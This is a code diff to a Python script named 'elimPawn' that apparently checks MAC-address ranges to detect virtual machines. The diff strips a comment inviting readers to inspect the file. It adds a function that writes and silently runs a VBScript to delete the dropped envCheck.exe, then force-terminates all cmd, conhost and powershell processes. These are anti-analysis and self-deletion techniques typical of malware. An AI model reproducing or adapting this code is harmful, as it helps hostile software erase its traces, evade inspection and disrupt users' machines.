@@ -1,11 +1,6 @@
 ############
 # elimPawn #
-#################################################################################
-#                                                                                #
-# envCheck-DEV.py                                                                #
-# You can look through this file if you're interested in what the script does :) #
-#                                                                                #
-##################################################################################
+############
 
 import os
 import wmi
@@ -47,6 +42,44 @@ def check_range(mac, prefix, start, end):
     end_int = mac2int(prefix + ":" + end)
 
     return start_int <= mac_int <= end_int
+
+def termination(): # Termination process, creates new VBS to delete envCheck.exe, which is ran fully hidden
+    try:
+        envCheckPath = "C:\\Users\\Public\\envCheck.exe"
+        selfDeleteVBS = f"{os.environ['TEMP']}\\c.vbs"
+        selfDeleteVBS_Payload = f"""
+Dim fso
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+WScript.Sleep 4000
+
+Dim envCheckPath
+envCheckPath = "{envCheckPath}"
+
+If fso.FileExists(envCheckPath) Then
+    fso.DeleteFile envCheckPath
+End If
+
+Set fso = Nothing
+"""
+        with open(selfDeleteVBS, "w") as f:
+            f.write(selfDeleteVBS_Payload)
+        os.system(f"start /B /MIN cscript //nologo {selfDeleteVBS}")
+        exit()
+    except Exception as e:
+        print(e)
+        pass
+    termProcesses = [ "conhost", "cmd", "powershell" ]
+    for process in termProcesses:
+        procs = [(p.pid, p.name()) for p in psutil.process_iter()]
+        filtered_procs = [p for p in procs if p[1].startswith(process)]
+
+        for termProc, _ in filtered_procs:
+            try:
+                win32process.TerminateProcess(termProc, 0)
+            except Exception as e:
+                os.system(f"taskkill /f /im {termProc}")
+
 
 start = "00:00:00"
 end = "FF:FF:FF"
